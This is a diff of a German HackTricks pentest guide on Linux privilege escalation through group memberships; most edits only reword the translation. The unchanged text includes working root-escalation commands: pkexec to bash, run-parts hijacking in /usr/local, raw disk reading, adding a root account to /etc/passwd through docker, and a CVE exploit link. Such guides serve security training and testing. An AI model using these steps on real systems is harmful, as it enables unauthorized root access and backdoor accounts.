@@ -1,18 +1,19 @@
 # Interessante Gruppen - Linux Privesc
 
+{% hint style="success" %}
+Lernen Sie und üben Sie AWS-Hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen Sie und üben Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-Andere Möglichkeiten, HackTricks zu unterstützen:
-
-* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
-* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
-* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys senden.
 
 </details>
+{% endhint %}
 
 ## Sudo/Admin-Gruppen
 
@@ -28,7 +29,7 @@ Andere Möglichkeiten, HackTricks zu unterstützen:
 ```
 Dies bedeutet, dass **jeder Benutzer, der zur Gruppe sudo oder admin gehört, alles als sudo ausführen kann**.
 
-Wenn dies der Fall ist, können Sie einfach Folgendes ausführen, um **root zu werden**:
+Wenn dies der Fall ist, können Sie einfach Folgendes ausführen, um **Root zu werden**:
 ```
 sudo su
 ```
@@ -38,7 +39,7 @@ Finde alle suid-Binärdateien und überprüfe, ob die Binärdatei **Pkexec** vor
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-Wenn Sie feststellen, dass das Binärprogramm **pkexec ein SUID-Binärprogramm** ist und Sie zur Gruppe **sudo** oder **admin** gehören, könnten Sie wahrscheinlich Binärdateien als sudo mit `pkexec` ausführen. Dies liegt daran, dass dies normalerweise die Gruppen innerhalb der **polkit-Richtlinie** sind. Diese Richtlinie identifiziert im Grunde genommen, welche Gruppen `pkexec` verwenden können. Überprüfen Sie dies mit:
+Wenn Sie feststellen, dass das Binärprogramm **pkexec ein SUID-Binärprogramm** ist und Sie zur Gruppe **sudo** oder **admin** gehören, könnten Sie wahrscheinlich Binärdateien als sudo mit `pkexec` ausführen. Dies liegt daran, dass dies in der Regel die Gruppen innerhalb der **polkit-Richtlinie** sind. Diese Richtlinie identifiziert im Grunde genommen, welche Gruppen `pkexec` verwenden können. Überprüfen Sie dies mit:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
@@ -54,9 +55,9 @@ polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freed
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-**Es liegt nicht daran, dass Sie keine Berechtigungen haben, sondern dass Sie nicht ohne eine GUI verbunden sind**. Und es gibt hier eine Lösung für dieses Problem: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Sie benötigen **2 verschiedene SSH-Sitzungen**:
+**Es liegt nicht daran, dass Sie keine Berechtigungen haben, sondern dass Sie ohne eine grafische Benutzeroberfläche nicht verbunden sind**. Und es gibt hier eine Lösung für dieses Problem: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Sie benötigen **2 verschiedene SSH-Sitzungen**:
 
-{% code title="session1" %}
+{% code title="Sitzung1" %}
 ```bash
 echo $$ #Step1: Get current PID
 pkexec "/bin/bash" #Step 3, execute pkexec
@@ -77,7 +78,7 @@ pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 ```
 %wheel	ALL=(ALL:ALL) ALL
 ```
-Dies bedeutet, dass **jeder Benutzer, der zur Gruppe wheel gehört, alles als sudo ausführen kann**.
+Das bedeutet, dass **jeder Benutzer, der zur Gruppe wheel gehört, alles als sudo ausführen kann**.
 
 Wenn dies der Fall ist, können Sie einfach **root werden, indem Sie Folgendes ausführen**:
 ```
@@ -93,7 +94,7 @@ So, lesen Sie die Datei und versuchen Sie, **einige Hashes zu knacken**.
 
 ## Mitarbeitergruppe
 
-**staff**: Ermöglicht Benutzern, lokale Änderungen am System (`/usr/local`) ohne Root-Rechte hinzuzufügen (beachten Sie, dass ausführbare Dateien in `/usr/local/bin` im PATH-Variablen jedes Benutzers enthalten sind und sie die ausführbaren Dateien in `/bin` und `/usr/bin` mit demselben Namen "überschreiben" können). Vergleichen Sie mit der Gruppe "adm", die mehr mit Überwachung/Sicherheit zu tun hat. [\[Quelle\]](https://wiki.debian.org/SystemGroups)
+**staff**: Ermöglicht Benutzern, lokale Änderungen am System (`/usr/local`) ohne Root-Rechte hinzuzufügen (beachten Sie, dass ausführbare Dateien in `/usr/local/bin` im PATH-Variable jedes Benutzers enthalten sind und sie die ausführbaren Dateien in `/bin` und `/usr/bin` mit demselben Namen "überschreiben" können). Vergleichen Sie mit der Gruppe "adm", die mehr mit Überwachung/Sicherheit zu tun hat. [\[Quelle\]](https://wiki.debian.org/SystemGroups)
 
 In Debian-Distributionen zeigt die `$PATH`-Variable an, dass `/usr/local/` mit höchster Priorität ausgeführt wird, unabhängig davon, ob Sie ein privilegierter Benutzer sind oder nicht.
 ```bash
@@ -105,7 +106,7 @@ $ echo $PATH
 ```
 Wenn wir einige Programme in `/usr/local` übernehmen können, können wir leicht Root-Zugriff erhalten.
 
-Das Übernehmen des Programms `run-parts` ist ein einfacher Weg, um Root-Zugriff zu erhalten, da die meisten Programme ein `run-parts` ähnliches Programm ausführen (Crontab, beim SSH-Login).
+Das Übernehmen des Programms `run-parts` ist ein einfacher Weg, um Root-Zugriff zu erhalten, da die meisten Programme ein `run-parts` ähnliches Programm ausführen werden (z. B. Crontab, wenn eine SSH-Anmeldung erfolgt).
 ```bash
 $ cat /etc/crontab | grep run-parts
 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
@@ -147,7 +148,7 @@ $ /bin/bash -p
 ```
 ## Festplattengruppe
 
-Diese Berechtigung ist fast **äquivalent zu Root-Zugriff**, da Sie auf alle Daten innerhalb der Maschine zugreifen können.
+Dieses Privileg ist fast **äquivalent zu Root-Zugriff**, da Sie auf alle Daten innerhalb der Maschine zugreifen können.
 
 Dateien: `/dev/sd[a-z][1-9]`
 ```bash
@@ -173,7 +174,7 @@ USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
 moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
-Der **tty1** bedeutet, dass der Benutzer **yossi physisch an einem Terminal auf dem Rechner angemeldet** ist.
+Die **tty1** bedeutet, dass der Benutzer **yossi physisch an einem Terminal auf dem Rechner angemeldet ist**.
 
 Die **Video-Gruppe** hat Zugriff, um die Bildschirmausgabe anzuzeigen. Grundsätzlich kannst du die Bildschirme beobachten. Um das zu tun, musst du **das aktuelle Bild auf dem Bildschirm erfassen** und die Auflösung, die der Bildschirm verwendet, erhalten. Die Bilddaten des Bildschirms können in `/dev/fb0` gespeichert werden und du könntest die Auflösung dieses Bildschirms in `/sys/class/graphics/fb0/virtual_size` finden.
 ```bash
@@ -210,12 +211,18 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 #Ifyou just want filesystem and network access you can startthe following container:
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
 ```
-## Adm-Gruppe
+## lxc/lxd Gruppe
 
-Normalerweise haben **Mitglieder** der Gruppe **`adm`** Berechtigungen zum **Lesen von Protokolldateien**, die sich im Verzeichnis _/var/log/_ befinden.\
+{% content-ref url="./" %}
+[.](./)
+{% endcontent-ref %}
+
+## Adm Gruppe
+
+Normalerweise haben **Mitglieder** der Gruppe **`adm`** Berechtigungen, um Protokolldateien im Verzeichnis _/var/log/_ zu **lesen**.\
 Daher sollten Sie, wenn Sie einen Benutzer in dieser Gruppe kompromittiert haben, definitiv einen **Blick auf die Protokolle** werfen.
 
-## Auth-Gruppe
+## Auth Gruppe
 
-Innerhalb von OpenBSD kann die **auth**-Gruppe normalerweise in die Verzeichnisse _**/etc/skey**_ und _**/var/db/yubikey**_ schreiben, wenn sie verwendet werden.\
-Diese Berechtigungen können mit dem folgenden Exploit zum **Erhöhen von Berechtigungen** auf root missbraucht werden: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+Innerhalb von OpenBSD kann die **auth** Gruppe normalerweise in die Verzeichnisse _**/etc/skey**_ und _**/var/db/yubikey**_ schreiben, wenn sie verwendet werden.\
+Diese Berechtigungen können mit dem folgenden Exploit zum **Privilegieneskalation** auf root missbraucht werden: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
